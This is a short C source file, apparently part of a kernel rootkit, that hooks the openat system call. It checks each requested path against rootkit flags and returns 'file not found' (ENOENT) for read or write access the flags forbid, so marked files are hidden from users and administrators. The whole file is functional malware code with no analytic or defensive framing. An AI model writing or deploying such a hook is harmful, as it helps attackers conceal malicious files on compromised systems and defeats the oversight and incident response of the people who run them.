#include "rootkit.h"

int hook_sys_openat(struct thread * td, struct openat_args * uap) {
	if(check_file(uap->path)) {
		int flag = uap->flag & 0x3;
		uint8_t rk_flags = get_flags(uap->path);
		if(flag == O_RDONLY && !(rk_flags & R_FLAG_READ)) {
			return ENOENT;
		}
		if(flag == O_WRONLY && !(rk_flags & R_FLAG_WRITE)) {
			return ENOENT;
		}
		if(flag == O_RDWR && (!(rk_flags & R_FLAG_READ) || !(rk_flags & R_FLAG_WRITE))) {
			return ENOENT;
		}
	}
	return sys_openat(td, uap);
}
